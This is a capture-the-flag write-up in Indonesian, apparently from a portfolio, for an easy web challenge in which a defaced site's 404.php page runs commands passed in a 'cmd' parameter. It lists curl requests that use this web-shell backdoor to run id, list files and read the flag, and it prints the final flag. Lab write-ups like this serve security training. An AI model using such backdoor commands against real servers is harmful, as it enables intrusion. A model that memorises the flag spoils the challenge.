---
title: "Write Up – Backdoor Behind 404"
description: "Migrated from database"
year: 2026
category: "CTF"
techStack: "Backdoor, CTF, WebExploit"
githubUrl: "-"
demoUrl: "-"
coverUrl: "/uploads/cover_1769571046677_af048e7601afa.png"
createdAt: "2026-01-28T03:30:46.813Z"
updatedAt: "2026-01-28T03:30:46.813Z"
---

# Write Up – Backdoor Behind 404

# Write Up – Backdoor Behind 404

  ## Challenge Overview

  Category: Web
  Difficulty: Easy
  Points: 150
  Author: aria

  Website baru saja di‑deface. Ada perilaku aneh saat mengakses halaman tidak ada (404). Hint: cmd.
  Target: https://bb.aria.my.id/

  Format flag:

  FGTE{...}

  ———

  ## Given Information

  ### Target Website

  - URL: https://bb.aria.my.id/
  - Kondisi: Homepage deface
  - Hint: cmd

  ### Challenge Hint

  > cmd

  Analisis Hint:

  - Parameter cmd kemungkinan dieksekusi di server
  - Backdoor sering disembunyikan di handler 404
  - Output command bisa disamarkan dalam halaman 404

  ———

  ## Key Insights

  ### 1. 404 handler ternyata bisa menjalankan command

  Akses langsung 404.php dengan parameter cmd menampilkan output di <pre>.

  Contoh:

  curl -i "https://bb.aria.my.id/404.php?cmd=id"

  Output:

  uid=33(www-data) gid=33(www-data) groups=33(www-data)

  ### 2. Enumerasi file di web root

  curl -s "https://bb.aria.my.id/404.php?cmd=ls%20-la"

  Terlihat file:

  - 404.php
  - index.html
  - index_original.html
  - note.txt
  - .htaccess

  ### 3. Flag disimpan di note.txt

  curl -s "https://bb.aria.my.id/404.php?cmd=cat%20note.txt"

  Flag muncul di output.

  ———

  ## Solution Steps

  ### Step 1 – Konfirmasi backdoor cmd

  curl -i "https://bb.aria.my.id/404.php?cmd=id"

  ### Step 2 – Listing direktori web root

  curl -s "https://bb.aria.my.id/404.php?cmd=ls%20-la"

  ### Step 3 – Baca note.txt untuk flag

  curl -s "https://bb.aria.my.id/404.php?cmd=cat%20note.txt"

  ———

  ## Final Flag

  ✅ Flag:

  FGTE{B4ckd00r_H1dd3n_1n_Pl41n_S1ght_404}

  ———

  ## Tools Used

  - curl – request HTTP dan eksekusi command via parameter cmd

  ———

  ## Conclusion

  Challenge ini menampilkan pola backdoor klasik:

  - Handler 404 (404.php) menjalankan cmd
  - Output disamarkan seolah error log
  - Flag disimpan sebagai file biasa di web root

 Key takeaway: halaman 404 sering jadi tempat menyembunyikan backdoor karena jarang diperiksa.
